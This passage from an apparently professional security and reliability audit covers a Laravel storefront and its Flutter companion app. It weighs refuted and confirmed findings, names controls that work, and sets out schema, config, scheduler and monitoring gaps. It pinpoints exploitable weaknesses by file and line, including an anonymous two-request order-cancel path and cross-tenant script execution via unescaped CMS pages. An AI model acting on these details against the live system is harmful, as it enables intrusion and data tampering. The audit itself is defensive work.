| R-12 | "The DataTables layer is a SQL-injection surface" | **REFUTED (negative result)** | Across all 39 files in `repo-A app/DataTables/` there is **no** dynamic column or sort name taken from the request — no `request()->get('order')`, no `input('columns')`, no `->order[`. `yajra/laravel-datatables` v11.0.0 resolves column names against the declared set. **The DataTables risk is XSS (SEC-23), not SQLi** |
| R-13 | "The 230 raw-SQL call sites are a broad injection surface" | **REFUTED (scope)** | Exactly **one** interpolates request input (SEC-22). The ~40 `whereRaw('BINARY \`code\` = ?', [...])` coupon sites are correctly parameterised; all `selectRaw`/`DB::raw` aggregates are static literals; all 6 `DB::statement` calls are `SET FOREIGN_KEY_CHECKS` constants. **This materially reduces the remediation budget** — it is a one-line fix, not an audit of 230 sites |
| R-14 | "The Arabic storefront loads a stylesheet and script that exist in no theme, so an Arabic storefront renders unstyled and LTR" (asserted CRITICAL) | **REFUTED** | The auditor read a **dead layout**. `repo-A resources/views/front_end/layouts/app.blade.php:18,74` does reference non-existent `rtl-main-style.css` / `rtl-custom.js`, but that file is not what renders the storefront: each theme ships its own override at `repo-A themes/{greentic,stylique,techzonix}/views/front_end/layouts/app.blade.php`, and the theme view path is **prepended** ahead of `resources/views`. Decisive proof the theme path is in effect: `main_file` — the storefront home view gated by `view()->exists('main_file')` at `repo-A app/Http/Controllers/HomeController.php:506` — exists **only** under `themes/*/views/`, so the homepage could not render at all otherwise. The theme layouts load `main-style.css` (`:18`) and `custom.js` (greentic `:89`, stylique `:94`, techzonix `:170`) **unconditionally**. **The real, narrower defect (MEDIUM/P2):** those layouts set `dir="rtl"` for ar/he at `:2` while loading only the LTR stylesheet, and greentic/techzonix ship **no** RTL stylesheet at all while stylique's `assets/css/rtl.css` is never referenced by its front_end layout — so an Arabic storefront is **mis-mirrored but fully styled and fully scripted**, not blank. Two genuinely broken references do remain (LOW), in standalone payment pages with no theme override: `repo-A resources/views/payment/nmi-payment.blade.php:5`, `resources/views/front_end/payment/nmi-payment.blade.php:6`, `resources/views/plans/Powertranz-payment.blade.php:7` |
| R-15 | "Custom domains are provisioned without TLS, so merchant storefronts run without certificates" (asserted CRITICAL) | **REFUTED as an active defect; real as a LATENT one. MEDIUM/P2** | The code observation is accurate — `repo-A app/Services/WebuzoDomainService.php:29` declares `bool $issueSsl = false` and `:43` sends `'issue_lecert' => $issueSsl ? 1 : 0`, and both call sites pass `false` explicitly (`repo-A app/Http/Controllers/AppSettingController.php:755`, `:868-872`). But **no custom domain is provisioned at all**: `repo-A config/services.php:120-122` resolves `WEBUZO_HOST`/`WEBUZO_USERNAME`/`WEBUZO_API_KEY` through bare `env()` calls with no defaults, and those three keys are absent from the committed `.env`, from the live `.env` on disk and from `.env.example`. `validateConfiguration()` (`repo-A app/Services/WebuzoDomainService.php:383-396`) therefore throws on **every** Webuzo request; on the custom-domain path the throw is caught at `:66` and the merchant gets an error banner with nothing persisted, and on the **subdomain** path there is no try/catch anywhere, so the merchant gets an uncaught HTTP 500. There is also no unprivileged actor: the only entry point is `Route::resource('app-setting', …)` at `repo-A routes/web.php:735`, inside the `auth`+`verified` group. Correct wording: **a latent defect to fix before the integration is ever enabled**, plus a currently-broken feature. UNKNOWN and outside the repo: whether the Webuzo panel issues a certificate regardless, and whether a server wildcard certificate covers tenant subdomains |
| R-16 | "`status_cancel` is callable by anyone with a single blind POST" | **REFUTED (precision)** | CSRF **is** enforced on it (the `web` group applies and the path is absent from the exception list), so a token-less POST returns 419. The accurate phrasing is "**unauthenticated, exploitable in two requests** by any anonymous visitor", because `csrf_token()` is rendered unconditionally to anonymous visitors at `repo-A themes/greentic/views/front_end/layouts/app.blade.php:9`. It also means the bug is **not** exploitable as a cross-site CSRF against a logged-in victim. Same correction applies to SEC-06 |
| R-17 | "The withdrawal payout endpoints are anonymously exploitable, and money leaves the business" (asserted CRITICAL) | **REFUTED on both limbs; severity CRITICAL → HIGH** | An anonymous caller gets `null` from `getCurrentStore()` (`repo-A app/Helper/helper.php:357-380` has no return when the user is falsy), so `where('store_id', null)` matches nothing and the `ModelNotFoundException` is swallowed into a harmless redirect. Customers and delivery boys are on separate guards and also degrade to the guest case. And `payWithdrawal` (`repo-A app/Http/Controllers/StoreFinanceController.php:888-1016`) contains **no gateway call** — it is pure DB mutation. The real defect is the missing **permission** check, exploitable by same-tenant staff, with ledger-integrity rather than fund-loss impact (SEC-26) |
| R-18 | "Refund abuse lets an attacker extract funds" | **REFUTED** | The injected `refund_amount` is consumed only by a Blade display (`repo-A resources/views/order/refund_details.blade.php:371`); it does not debit a store wallet, credit a customer wallet, alter `order.final_price` or trigger any gateway call. The real issues are a **falsified refund ledger plus a cross-tenant integrity breach** (access control), and — far more important commercially — that **no refund ever reaches a customer at all** (SEC-27) |
| R-19 | "`GET /{slug}/page/{page_slug}` lets an attacker read any tenant's CMS page" (asserted CRITICAL) | **REFUTED on steerability and on confidentiality; severity CRITICAL → HIGH, and the impact is different** | The missing tenant filter is real — `repo-A app/Http/Controllers/HomeController.php:1706-1711` resolves the page by `page_slug` + `page_status` only, having already resolved `$store` on the preceding line. But the query has **no ORDER BY and ends in `->first()`**, so for a given slug the platform returns exactly **one** row (in practice the oldest published match) no matter which `{storeSlug}` is in the URL: **the bug is not steerable**, an attacker cannot choose a victim tenant, and a newer merchant cannot override an older store's page. The confidentiality gain is **zero** — the only obtainable row is `page_status = 1` (published) and is already served anonymously at its own owner's URL, and the attacker must know the slug either way. **The genuine residual impact is integrity and compliance, and it is unconditional rather than attacker-triggered:** `repo-A app/Helper/helper.php:911-939` seeds eight identical default slugs into **every** store and merchants may create any further slug with no uniqueness check (`repo-A database/migrations/2023_12_18_101105_create_pages_table.php:17` has no unique index; `repo-A app/Http/Controllers/PageController.php:43-49` has no `unique` rule), so on every collision each store except the oldest renders **another tenant's** CMS content — a wrong Privacy Policy or Terms shown to another merchant's customers — and because `repo-A resources/views/front_end/pages/page.blade.php:26` renders it as `{!! $page->page_content !!}`, the oldest tenant's raw HTML and JavaScript **executes on every other tenant's storefront origin**. Fix is one clause (`->where('store_id', $store->id)`) plus escaping plus a `(store_id, page_slug)` unique index |
| R-20 | "`lab404/laravel-impersonate` is a live impersonation risk" | **REFUTED — the feature is MISSING, which is the good news** | The trait is imported and applied (`repo-A app/Models/User.php:14,25`) but four negative greps confirm **no impersonation routes exist, there is no `config/impersonate.php`, and neither `canImpersonate()` nor `canBeImpersonated()` is overridden**. **Nobody can impersonate anybody, because the feature is not wired up.** The risk is *latent*: the package defaults both methods to `true` for every model carrying the trait, so if anyone later adds the package's routes without overriding them first, **every** user becomes able to impersonate **every** user. Given this codebase's demonstrated habit of adding routes without middleware, the recommendation is to **delete the trait and the dependency** (LOW, P2) rather than to harden it |
| R-21 | "The Laratrust admin panel is an unauthenticated role editor" | **REFUTED (not currently)** | `repo-A config/laratrust.php:285` sets `'panel' => ['register' => false]`, so the panel is **not registered**. Flagged as a **configuration landmine**: its middleware is `['web']` with no `auth` (`:327`), so flipping `:285` to `true` without also fixing `:327` would publish an unauthenticated role and permission editor |
| R-22 | "The repository cannot build its own schema / cannot be provisioned" | **REFUTED (mechanism), CONFIRMED (substance)** | `php artisan migrate` would **succeed** — all 207 migrations are internally valid and none references the missing tables, so nothing errors at migrate time and the app boots. What fails is the **application code running against the schema they produce**. Accurate wording: "migrations run clean but yield a schema missing 15 tables and 3 columns that the application queries unconditionally." See Section 4.2 — this is a reproducibility and disaster-recovery defect, **not** a security vulnerability and not a total provisioning failure |
| R-23 | "The six Finance permissions are permanently inaccessible" | **REFUTED (precision), CRITICAL → HIGH** | The failure is **fail-closed** (403), i.e. denial, not exposure, and it is remediable by a single seeder addition or manual row insert — "permanently" is wrong. The blast radius was also mis-scoped: **6 of 10** finance endpoints are locked out, while **3 are unprotected** (SEC-26). Live production state is UNKNOWN, because the code having no creation path does not prove the deployed `permissions` table lacks the rows |
| R-24 | "`UserController` password-reset paths are broken by the missing `audit_logs` table" | **REFUTED for that specific path** | `AuditLog::record()` at `repo-A app/Http/Controllers/UserController.php:333` lives in `updatePassword()` (`:312-341`), which — along with its sibling `reset()` (`:296-311`) — has **no route anywhere in the repo**; all 80 route-shaped files were searched. That call site is unreachable dead code. **What the claim missed is worse and is real:** `password_update()` (`:384`), routed at `repo-A routes/web.php:782`, calls `AuditLog::record()` unconditionally at `:426` **after** the password has already been written, so the self-service password change also 500s — a commit-then-HTTP-500 half-completed operation, not a no-op |
| R-25 | "The `lib/view/widget` vs `lib/view/new_widgets` split in Repo B is a duplicated, abandoned layer" | **REFUTED** | Both are live. Measured importer counts: `widget/common_snak_bar_widget.dart` 43, `common_appbar_widget.dart` 31, `app_dialog.dart` 19, `error_empty_state.dart` 15; `new_widgets/shimmer.dart` 20, `app_txt_field.dart` 8. The accurate finding is **an undocumented split with no stated boundary**, plus two concrete near-duplicates (`delivery_boy_bottom_sheet.dart` exists in both trees at 247 and 562 lines; two snackbar systems). MEDIUM/P2 consolidation debt, **not rot** |
| R-26 | "Repo B's Firebase surface is broad (core, messaging, analytics, crashlytics, remote_config)" | **REFUTED (scope)** | `firebase_analytics` (`repo-B pubspec.yaml:62`) and `firebase_remote_config` (`:60`) are declared but **never wired** — no analytics event is ever logged and no remote flag is ever read. The live surface is **core + messaging + crashlytics only**. They are dead weight in the binary and in the Firebase project |
| R-27 | "Repo B's `flutter_quill` rich-text editor is a stored-XSS/HTML source" | **REFUTED** | `flutter_quill: ^11.5.0` is declared at `repo-B pubspec.yaml:50` but `grep -rln -i quill lib/` returns **zero files** — it is an **unused dependency**, so no Quill delta or HTML is produced by the app at all. Admin-side rich text is Summernote on the Repo A side, and its output is what reaches the raw sinks in SEC-28 |
| R-28 | "Repo B's committed Firebase config files are a secret leak" | **REFUTED** | `google-services.json` and `GoogleService-Info.plist` hold **client-side identifiers** that Google designs to ship inside the app binary; committing them is normal practice. The real control is Firebase Console API-key restriction plus Firestore/Storage security rules, which live outside this repository. (Key paths were enumerated to confirm this; **no values were read or printed.**) The genuine defect nearby is the **stale iOS bundle id** — still the stock Workdo registration at `repo-B ios/Runner/GoogleService-Info.plist:18` |

### 3.1 Things that are genuinely done well, and should not be "fixed"

Recording these matters for sizing: they are the evidence that the codebase is repairable rather than
hopeless, and that someone on the team knows how to do this correctly.

- **The Zid webhook authenticates.** `repo-A routes/web.php:987-998` checks a shared secret via header or
  basic auth and `abort(401)`s otherwise. (Residual issues noted under SEC-14, but the control exists.)
- **`handlePaymeraCallback` does not trust callback parameters.**
  `repo-A app/Http/Controllers/PaymentController.php:74-104` **re-polls the gateway server-side** at
  `:97-99`, checks the status at `:101`, and has replay protection via a cache guard at `:76,87`.
  **This is the correct design and is the template the other ~24 gateways should copy.**
- **`DeliverySyriaOrderController::updateStatus` authenticates properly in-controller** — `X-Platform`
  header check (`:25-32`), required bearer token (`:39-46`), and `hash_equals` against the store owner's
  secret (`:163`). **Not a finding.**
- **The correct Sanctum hash comparison exists in the codebase** at
  `repo-A app/Http/Controllers/Api/DashboardController.php:625-628` and can be lifted verbatim.
- **Guard separation is real** (`repo-A config/auth.php:16-18,43-50,71-78`): customers and delivery boys
  cannot reach admin web routes. This is what bounds several findings to merchant-side actors.
- **The merchant web auth path handles sessions correctly** —
  `repo-A app/Http/Controllers/Auth/AuthenticatedSessionController.php:77` regenerates on login and
  `:139-141` invalidates and regenerates the token on logout.
- **The web customer OTP flow is sound** — 6 digits, bcrypt-stored, `Hash::check`-verified, 5-minute
  expiry, session-bound, store-scoped. Its only gap is a missing route throttle. **Port it to the API
  rather than writing anything new.**
- **Zero PHP syntax errors across all 3,113 PHP files** (Section 5) and `composer.json` is valid.
- **All uploads funnel through one helper** — zero direct `->store(`/`->storeAs(`/`->move(`/`Storage::put`
  calls — so SEC-15 has a single chokepoint fix.
- **The npm side is clean**: `repo-A package.json` has **no runtime dependencies**, only 8 build-time
  devDependencies.
- **Repo B's network layer is the best-engineered file in either repo** — five verbs, explicit 30s/60s
  timeouts applied to every call, a per-verb exception ladder mapped to translated failure reasons,
  centralised Laravel-style error-body parsing, global 401 handling, and a `Result`/`Failure` sum type.
- **Repo B's loading, shimmer and empty/error states are genuinely implemented** — 668 lines of
  hand-rolled, theme-aware, RTL-aware shimmer imported by 20 files; `EmptyState`/`ErrorState` imported by
  15; pull-to-refresh in 17 files.
- **Repo B's translations are near-complete** — 640 (en) / 642 (ar) keys with **no** key present in English
  and missing from Arabic. The content is ready; only the framework plumbing is unwired.
- **Repo B's API contract against Repo A is complete** — all 48 endpoint paths in
  `repo-B lib/utils/base_api.dart` resolve to real routes under
  `repo-A routes/api.php`'s `Route::prefix('admin')` group. Zero orphans. The integration is real, not
  aspirational.
- **Repo B commits no keystore, no password and no API secret**, and its `.gitignore` hygiene for signing
  material is correct.

---

## 4. RELIABILITY AND OPERATIONAL RISKS

These are not attacks. They are the ways this system fails on its own, and several of them are worse for
the business than the vulnerabilities above, because they lose money or data silently.

### 4.1 Operational readiness scorecard

| Capability | Status | Evidence |
|---|---|---|
| Automated tests (business logic) | **MISSING** | 10 files in `repo-A tests/`, all unmodified Breeze scaffolding; 0 tests across all 69 addon modules |
| Test DB isolation | **MISSING (dangerous)** | SEC-18 |
| CI/CD | **MISSING** | no `.github/`, `.gitlab-ci.yml`, `.circleci/`, `Jenkinsfile`; `git ls-files \| grep -icE '(Dockerfile\|docker-compose\|Procfile\|Jenkinsfile\|\.gitlab-ci\|\.travis)'` → **0** |
| Containerization | **MISSING** | no `Dockerfile`, no `docker-compose*` — **despite `repo-A composer.json:79` requiring `laravel/sail`**, which is useless without a compose file |
| Deployment automation | **MISSING** | manual cPanel file copy (SEC-32); the only `deploy*` matches in `git ls-files` are FontAwesome `deploydog.svg` icons |
| Release process / versioning / rollback | **MISSING** | 6-commit squashed history, no tags, no changelog, no artifact |
| Secret management | **BROKEN** | SEC-16 |
| Config correctness | **BROKEN** | Section 4.3 — Laravel 10 key names against Laravel 11 config |
| Reproducible fresh install | **PARTIAL** | Section 4.2 |
| Scheduled tasks | **PARTIAL** | 1 real job; 5 functional commands orphaned (Section 4.3) |
| Queue workers | **MISSING** | Section 4.3 |
| Error tracking | **PLACEHOLDER OR MOCK** | Section 4.4 |
| APM / uptime monitoring | **MISSING** | `/up` exposed at `repo-A bootstrap/app.php:13`; nothing polls it |
| Log management / rotation | **PARTIAL** | daily channels defined but `storage/` absent from the checkout; `error_log` committed |
| Backup | **PARTIAL + unsafe** | SEC-19 |
| **Restore / recovery** | **MISSING** | SEC-19(g) — `show()`, `edit()`, `update()` are empty stubs |
| Static analysis / lint enforcement | **MISSING** | `laravel/pint` is required at `repo-A composer.json:78` and **unconfigured**; no `phpstan.neon`, `psalm.xml`, `rector.php`, `pint.json`, `.php-cs-fixer.php` |
| Project documentation | **MISSING** | `repo-A README.md` is 66 lines of the **unmodified stock Laravel README**, with a CI badge pointing at `github.com/laravel/framework`. No `docs/`, CHANGELOG, CONTRIBUTING or runbook |
| Dependency currency | **PARTIAL** | Section 6 — 3 abandoned packages, two of them on the money or install path |

### 4.2 The repository cannot reproduce its own database schema — CRITICAL / P0

This is, in my assessment, the most under-appreciated risk in the entire audit, because nothing is
currently broken in production and so nobody feels it.

**The fact.** Repo A contains exactly **207 migrations** (105 in `repo-A database/migrations`, 102 under
`repo-A packages/workdo/*/src/database/migrations`) and **no other schema source exists**. That was
established four independent ways: per-table quote-agnostic regex plus raw `CREATE TABLE` searches over
`*.php`/`*.sql`/`*.stub`/`*.json`; enumerating all 168 distinct `Schema::create('<literal>')` names in the
tree; `git grep -l` over **all** tracked files with no extension filter; and confirming there is no
`*.sql` file anywhere, no `database/schema/` squashed dump, no `DB::statement`/`DB::unprepared`
`CREATE TABLE`, no `Schema::create` in any seeder or provider, and no out-of-tree migrations directory.
`vendor/` is neither tracked nor present, so no published vendor migrations exist either.

**Against that complete set, fifteen tables that live, routed code reads and writes have no `Schema::create`
anywhere:**

| Table | Reached from | Money-bearing |
|---|---|---|
| `store_order_financials` | `repo-A app/Services/OrderFinancialService.php:28,90,228` | **yes** |
| `store_wallets` | `repo-A app/Models/StoreWallet.php:9` | **yes** |
| `store_wallet_transactions` | `repo-A app/Models/StoreWalletTransaction.php:9` | **yes** |
| `store_withdrawals` | `repo-A app/Models/StoreWithdrawal.php:9` | **yes** |
| `currency_rates` | `repo-A app/Models/CurrencyRate.php:9` | **yes** |
| `delivery_earnings` | `repo-A app/Models/DeliveryEarning.php:9` | **yes** |
| `audit_logs` | `repo-A app/Models/AuditLog.php:9` | no |
| `otp_integrations` | `repo-A app/Models/OtpIntegration.php:9` | no |
| `chatwoot_integrations` | `repo-A app/Models/ChatwootIntegration.php:9` | no |
| `chatwoot_notification_templates` | `repo-A app/Models/ChatwootNotificationTemplate.php:9` | no |
| `delivery_boy_devices` | `repo-A app/Models/DeliveryBoyDevice.php:12` | no |
| `delivery_boy_notifications` | `repo-A app/Models/DeliveryBoyNotification.php:12` | no |
| `zid_stores` | `repo-A app/Services/Zid.php:11,25` | no |
| `zid_orders` | `repo-A app/Console/Commands/ZidProcessEvents.php:90`; written at `repo-A app/Http/Controllers/DeliverySyriaStatusController.php:192` | no |
| `zid_events` | read/updated at `repo-A app/Console/Commands/ZidProcessEvents.php:47,57`; inserted at `repo-A routes/web.php:1004` | no |

Their write paths are HTTP-reachable: `repo-A routes/web.php:156,161` (currency rates),
`:165,168,171,177,183,186,189,192,197` (finance), `repo-A routes/api.php:361,362,365` (wallet),
`repo-A routes/api.php:328-331` (delivery-boy notifications).

**Plus three columns.** `orders.currency_code` and `orders.currency_symbol` exist in **no** migration (a
search of every migration file for `currency_code|currency_symbol` returns zero files, and
`repo-A database/migrations/2024_01_23_061635_create_orders_table.php:14-45` lists the full column set
without them) — yet both are in `Order::$fillable` (`repo-A app/Models/Order.php:26-27`) and are set
unconditionally by a `static::creating` hook at `:63-80`. Since **no** `DB::table('orders')->insert`
exists anywhere, every order creation goes through Eloquent and therefore through that hook. And
`softDeletes|deleted_at` returns **zero occurrences in every migration file** and in fact zero
repo-wide outside `vendor/`, while `repo-A app/Models/Customer.php:16,20` applies the `SoftDeletes` trait
— which installs a global scope appending `customers.deleted_at is null` to **every** Customer query.

**What this means on a freshly migrated schema.** `php artisan migrate` **succeeds** (see R-22) and the
operator sees no error. Then three failures follow deterministically, with no middleware, config flag or
`Schema::hasColumn` guard anywhere that suppresses them:
1. **Customer authentication is entirely unavailable** — the `customers` guard is bound to that model
   (`repo-A config/auth.php:43-46,75-78`), so registration, login and every admin customer listing fail
   with `Unknown column 'customers.deleted_at'`.
2. **No order can be placed** — every insert fails on the unknown currency columns, across all eight
   payment controllers.
3. **No merchant finance action works** — `GET /finance`, add/deduct balance, approve/pay withdrawal,
   currency rates and `DeliveryEarning::create` all fail with "base table or view not found".
4. **And the worst one, because it is silent:** a customer completes checkout, the `Order::created`
   observer fires (`repo-A app/Providers/AppServiceProvider.php:30`), `OrderFinancialService` fails on the
   missing tables — but `repo-A app/Observers/OrderObserver.php:15-20` and `:35-41` catch `\Exception` and
   only `\Log::error`. **The order is accepted and the merchant is never credited.** Unbounded financial-
   record loss that no user-facing error reveals. *(Two unguarded paths by contrast hard-fail with HTTP
   500: `AuditLog::record` called bare from `repo-A app/Http/Controllers/UserController.php:131`, and
   `CurrencyRate` queried with no try/catch inside `ProductList` at
   `repo-A app/Http/Controllers/Api/DashboardController.php:832` — which is the merchant product-list API
   that **Repo B consumes**.)*

**The honest bound.** The production database very likely already contains these objects, created by hand
outside version control, which is why the live site functions. **That cannot be confirmed or denied from
the checkout** (no DB access). So the realised harm today is not an outage: it is that **the production
schema is undocumented and exists only on the live server**. Combined with no CI, no `docs/`, no schema
dump and no working restore (SEC-19), a disk loss, a host migration, a staging clone or onboarding a
second developer **cannot be recovered from this repository** without reverse-engineering the schema from
a live dump. That is why this is CRITICAL/P0 on disaster-recovery grounds rather than security grounds.

**Remediation.** Take a schema-only dump of production (`mysqldump --no-data`), diff it against what the
207 migrations produce, and commit the difference as new migrations — then keep it true by adding CI that
runs `migrate:fresh` on every push. Nothing else in the remediation plan is durable until this exists.

**A fifth install-reproducibility defect, independent of the above.** `migrate --seed` installs **1 of 51**
module migration sets. The mechanism exists —
`repo-A app/Console/Commands/PackageMigrate.php:17,61,72-98` iterates every module with no argument — but
`repo-A database/seeders/DatabaseSeeder.php:18-28` calls it for exactly one module
(`Artisan::call('package:migrate LandingPage')`). The other 50 directories, including `BackupRestore`,
`AuctionProduct`, `PreOrder`, `PartialPayments` and `LotteryPrizes`, are never migrated. An operator must
additionally know to run `php artisan package:migrate` with no argument, **and that instruction exists
nowhere** (the README is stock). Two smaller defects in the same ten lines: `:20` calls
`Artisan::call('migrate')` **from inside a seeder**, so `db:seed` silently mutates schema; and the seeder
ordering is implicit and undocumented, with each module's own seeders never called at all. Separately,
`repo-A .gitignore:5` ignores the **entire** `storage/` tree and no `.gitkeep` survives, so **a fresh
clone cannot boot Laravel** until an operator hand-creates `storage/framework/{cache/data,sessions,views}`
and `storage/logs` — which matters more because `repo-A .env:18` sets `SESSION_DRIVER=file`.

### 4.3 Silent configuration failures — HIGH / P1

The `.env` was written for Laravel 10 conventions while `config/` is Laravel 11 and reads different
variable names. Each pairing was verified by grepping the `env()` call site and counting the key's
presence in `.env`:

| `.env` sets | `config/` actually reads | Effective value | Consequence |
|---|---|---|---|
| `MAIL_DRIVER=smtp` (`repo-A .env:25`) | `repo-A config/mail.php:18` → `env('MAIL_MAILER', 'log')` | **`log`** (`MAIL_MAILER` absent) | **No e-mail is ever sent.** Password resets, OTPs, order confirmations and invoices are written to a log file |
| `QUEUE_DRIVER=sync` (`repo-A .env:19`) | `repo-A config/queue.php:16` → `env('QUEUE_CONNECTION', 'database')` | **`database`** | Jobs persist to the `jobs` table instead of running inline, and **nothing drains them** |
| `BROADCAST_DRIVER=reverb` (`repo-A .env:15`) | `repo-A config/broadcasting.php:18` → `env('BROADCAST_CONNECTION', 'null')` | **`null`** | Realtime broadcasting is off despite 6 `REVERB_*` and 4 `VITE_REVERB_*` variables being configured |
| `CACHE_DRIVER=file` (`:16`) | `repo-A config/cache.php:18` → `env('CACHE_STORE', 'file')` | `file` | Benign — `CACHE_STORE` is also present at `:17` |
| `APP_LOG_LEVEL=debug` (`:5`) | `repo-A config/logging.php` → `env('LOG_LEVEL', 'debug')` | `debug` | Benign **by accident**; `APP_LOG_LEVEL` is dead config |

**The first three are real functional breakage hiding behind correct-looking configuration** — an operator
reading `.env:25-30` would reasonably believe SMTP is configured. The mail one stacks with the queue one:
**e-mail has two independent failure modes**, so a password-reset or OTP flow cannot complete even if one
is fixed. Twenty classes implement `ShouldQueue` across `app/` and `packages/workdo/` (10 mailables and
notifications plus 10 module listeners and jobs) feeding 26 send/notify call sites, and **no worker is
defined anywhere in the repository** — no supervisor conf, no systemd unit, no Procfile, no Horizon.
Loyalty points (`RewardClubPoint`) and checkout field capture (`AdditionalFieldInCheckout`) stall
identically.

**The scheduler — premise CONFIRMED, consequence BLOCKED and the severity lowered.**
`repo-A routes/console.php` is 9 lines. `:3-4` import only `Illuminate\Foundation\Inspiring` and
`Illuminate\Support\Facades\Artisan`, and line 9 was hand-added as
`Schedule::command('zid:process-events')->everyMinute()->withoutOverlapping();` **without the matching
`use Illuminate\Support\Facades\Schedule;` import**. That much is re-verified and correct. The
*project-level* evidence is also complete: no file in the repo imports the facade; `repo-A config/app.php`
has **no `aliases` key at all** (verified by reading the file and by `grep -rn "'aliases'" config/` → no
output); `repo-A bootstrap/cache/packages.php` carries 20 `aliases` blocks and **0** `Schedule` entries;
nothing calls `AliasLoader` or `class_alias`; there is no `withSchedule()` closure in `bootstrap/app.php`;
and for contrast `repo-A routes/web.php:4` *does* import its facade, so **project-declared** global
aliases are not this codebase's convention.

**The counter-consideration, and why the earlier HIGH rating is withdrawn.** An earlier pass of this audit
concluded from that evidence that `\Schedule` is undefined, that line 9 therefore throws
`Class "Schedule" not found` on every console boot — `migrate`, `schedule:run`, `phpunit` — and that this
makes "the entire artisan CLI unusable from a clean checkout", at HIGH severity. **That conclusion does not
follow from the premise.** Laravel registers a set of global facade aliases *itself*, through
`Illuminate\Foundation\AliasLoader` seeded from `Facade::defaultAliases()`, and that registration does
**not** require the project to declare a `config/app.php` `aliases` key — which is precisely the evidence
the earlier reasoning leaned on. If `Schedule` is in the framework's default alias set at the installed
version, the unqualified `Schedule::` resolves and **the predicted fatal error never occurs**; that is also
the likelier reading, since the line was presumably written against a checkout where it worked. Nothing in
this repository decides it, because deciding it means reading the installed framework source.

**Status: UNVERIFIABLE in this environment — BLOCKED, not failed.** `vendor/` is **ABSENT**, so no
`php artisan` command was run at all and the PHPUnit suite was **NOT EXECUTED**. Severity is therefore
recorded as **LOW / P3** on what is actually proven — a missing `use` statement in a 9-line file — and the
HIGH-severity "CLI unusable" framing is withdrawn as unproven. **One command after `composer install`
settles it: `php artisan schedule:list`.** If it prints the job, only the cosmetic missing import remains
(LOW / P3); if it throws, the CLI is unusable from a clean checkout and it is P0. **Add the `use`
statement regardless** — a one-line change that removes the question entirely, whichever way it would have
gone.

**Only one real scheduled job exists**, and five functional commands are registered but never scheduled —
so four customer-facing revenue features have their execution engine written and no ignition:

| Command | Defined at | Scheduled? | Consequence |
|---|---|---|---|
| `zid:process-events` | `repo-A app/Console/Commands/ZidProcessEvents.php:14` | **yes**, `everyMinute()` | — (but see above) |
| `zid:refresh` | `repo-A app/Console/Commands/ZidRefreshTokens.php:10` | **NO** | Zid OAuth tokens expire → Zid order ingestion silently dies |
| `auction:order` | `repo-A packages/workdo/AuctionProduct/src/app/Console/Auction.php:25` | **NO** | Auctions never close; winners never become orders |
| `partial:preorder` | `repo-A packages/workdo/PreOrder/src/app/Console/PreOrder.php:17` | **NO** | Pre-orders never fulfilled |
| `partial:payment` | `repo-A packages/workdo/PartialPayments/src/app/Console/Payment.php:18` | **NO** | Instalments never processed or chased |
| `lottery:order` | `repo-A packages/workdo/LotteryPrizes/src/app/Console/Lottery.php:26` | **NO** | Draws never run; the win/fail e-mail jobs never dispatch |

`Auction.php:30` and `Lottery.php:31` still carry the generator stub
`protected $description = 'Command description.';` — these were never finished. There is also **no
cron/systemd/supervisor artifact in the repo** to run `schedule:run` in the first place, and whether the
cPanel account has such a cron entry is **UNKNOWN** — if it does not, even the one wired job never fires.

### 4.4 Observability — error tracking is dead twice over

`repo-A composer.json:31` requires `larabug/larabug: ^3.1`, it is auto-discovered, and it is wired into the
**default** log channel: `repo-A config/logging.php:53-58` makes `stack` = `['single', 'larabug']`, and
since `LOG_CHANNEL` is absent from `.env`, `repo-A config/logging.php:21` defaults to `stack` — so this
path is live. But the credentials are empty and never supplied: `repo-A config/larabug.php:15,27` default
`login_key` and `project_key` to `''`, and `grep -cE '^LB_' .env` → **0**. Independently,
`repo-A config/larabug.php:38-40` restricts sending to `production` while `repo-A .env:2` sets
`APP_ENV=local`. **Exceptions go nowhere external.** A secondary risk: `'ignore_exceptions' => false` on
the stack (`repo-A config/logging.php:57`) means a throw from the misconfigured handler is not swallowed,
so a logging failure can surface as a request failure (inference — not executed).

**Absent entirely:** Sentry, Bugsnag, Flare, Telescope, Pulse, Rollbar, New Relic, Datadog. `/up` is
exposed at `repo-A bootstrap/app.php:13` and nothing polls it. `shetabit/visitor` is installed and
coherent but is **page-view analytics, not operational monitoring**.

**Repo B is the same story, one line away from being fixed.** `repo-B lib/main.dart:49-55` installs both
global Flutter error hooks into `FirebaseCrashlytics`, and the Gradle plugin is applied — **but
`repo-B android/app/src/main/AndroidManifest.xml:35-37` sets
`firebase_crashlytics_collection_enabled` to `false`**, and nothing in `lib/` calls
`setCrashlyticsCollectionEnabled(true)`. The pipeline was built and then switched off. **The owner will
believe he has crash telemetry and receive none from Android.** iOS has no equivalent opt-out key in
`repo-B ios/Runner/Info.plist`, so iOS would report — untestable here. *HIGH/P1, one-line fix, but land it
**after** SEC-20 so logged passwords do not ship to Crashlytics breadcrumbs. Given zero tests and no CI,
crash telemetry is currently the **only** production feedback channel this project would have.*

### 4.5 Deployment and hosting — the constraint behind four other fixes

The evidence points to manual file copy onto cPanel shared hosting at `/home/<redacted-account>/public_html`
(`repo-A error_log:1`), with the repository root as the document root (SEC-32), `APP_DEBUG=true`, and at
least one PHP fatal error having reached production and been fixed **by editing files on the live server** —
`repo-A app/Http/Controllers/Api/ApiController.php:38-44` now has single `use` statements with tell-tale
blank gaps where the duplicates named in `error_log:1` were removed. That is the signature of having no CI
and no staging.

This matters beyond hygiene, because **four separate remediations assume capabilities that shared hosting
typically withholds**: a cron entry and a `queue:work` supervisor program (Section 4.3), `mysqldump` plus
an outbound route to object storage (SEC-19), a document-root change (SEC-32), and reproducible builds.
**Deciding the hosting model once unblocks all four**, and it replaces "manual copy, debug on the live
server" with a repeatable artifact. `laravel/sail` is already a dev dependency
(`repo-A composer.json:79`) with no `docker-compose.yml`, so there is a starting point. The cost is real
migration effort, and the `0777` permission model the installer prescribes
(`repo-A config/installer.php:46-53`) must be replaced with proper ownership — which may surface
write-permission bugs in module code that currently relies on world-writable paths.

### 4.6 Repo B reliability risks

- **A backend type change can crash a screen.** 29 models, of which **3** carry a `// updated` marker and
  guard both null *and* container type (`repo-B lib/core/model/product_model.dart:11-16,40-66`). The other
  26 are weaker — `repo-B lib/core/model/dashboard_model.dart:17-22` takes `dynamic json` and assigns
  straight through. The brittleness applies to both generations: the hardened files use `as int?` /
  `as String?` (78 such casts in `product_model.dart` alone), and **`as int?` throws a `TypeError` if the
  value arrives as a String** — which a Laravel/Eloquent payload very commonly does (`"status": "1"`).
  So the "safe" models are the ones that throw on type drift. There is no `num.tryParse` coercion layer in
  deserialisation (`repo-B lib/utils/helper.dart:78-93` has a good `parsePriceSafe`, but it is applied at
